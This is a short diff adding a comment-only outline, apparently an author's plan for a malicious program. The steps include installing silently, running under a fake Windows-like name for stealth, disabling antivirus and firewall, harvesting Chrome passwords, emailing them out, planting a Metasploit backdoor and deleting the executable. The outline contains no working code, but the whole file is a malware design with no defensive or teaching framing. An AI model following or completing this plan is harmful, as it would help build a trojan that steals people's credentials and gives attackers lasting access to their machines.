@@ -1,0 +1,20 @@
+# steps
+# after downloaded
+# install silently
+# always running with fake name ('windows op') ##stealth
+# disable antivrus/ firewall silently (???.bat)
+# try to get passwords
+# if chrome + working
+   # send dpasswords to dummy email
+   # when emails is confirmed sent
+      # create backdoor/ metasploit
+   # del exe
+      # create backdoor/ metasploit
+       #  
+
+#if  chrome + running
+  # wait till chrome + working
+
+# if no chrome or failed
+  # create backdoor/ metasploit
+  # del exe
